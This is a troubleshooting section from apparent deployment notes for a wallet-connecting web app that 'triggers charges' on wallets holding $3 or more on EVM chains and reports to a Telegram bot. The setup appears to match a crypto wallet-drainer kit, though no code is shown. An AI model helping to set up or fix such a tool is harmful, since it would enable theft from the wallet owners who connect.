================================================================================
IF SOMETHING GOES WRONG
================================================================================

Build Fails:
→ Check Root Directory is "apps/web"
→ Check all 6 environment variables are present
→ Click "Redeploy" and try again

Wallet Not Connecting:
→ Verify NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID is correct
→ Clear browser cache (Ctrl+Shift+Delete)
→ Try in incognito/private window

No Charges Triggering:
→ Make sure portfolio >= $3 on EVM chains
→ Make sure wallet is connected
→ Check browser console (F12) for errors

Telegram Not Working:
→ Verify bot token is correct
→ Verify chat ID is correct
→ Make sure you sent /start to @BotFather and @userinfobot first
